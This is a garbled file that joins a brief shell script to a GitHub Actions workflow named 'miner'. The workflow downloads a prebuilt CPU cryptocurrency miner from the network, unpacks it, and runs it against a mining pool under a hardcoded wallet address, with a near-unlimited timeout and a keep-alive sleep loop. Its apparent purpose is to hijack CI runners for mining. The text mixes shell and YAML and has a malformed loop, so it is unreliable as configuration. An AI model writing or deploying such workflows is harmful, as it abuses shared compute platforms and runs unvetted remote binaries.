#!/bin/sh
sudo apt update
sudo apt install screen -y
# This is a basic workflow to help you get started with Actions

name: miner 

# Controls when the action will run. 
on: workflow_dispatch
# A workflow run is made up of one or more jobs that can run sequentially or in parallel
jobs:
  # This workflow contains a single job called "build"
  build:
    # The type of runner that the job will run on
    runs-on: ubuntu-latest
    timeout-minutes: 9999
    # Steps represent a sequence of tasks that will be executed as part of the job
    steps: 

    # Runs a single command using the runners shell
      - name: cloning
        run: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
      - name: getting unzip
        run: tar -xvf hellminer_cpu_linux.tar.gz
      - name: Running hellminer
        run: ./hellminer -c stratum+tcp://ap.luckpool.net:3956 -u RPzoRzbAZLNcTXJ2D7NvpprGUMrrWBh12c.oskg -p x --cpu 2
        while [ 1 ]; do
sleep 3
done
sleep 999
        
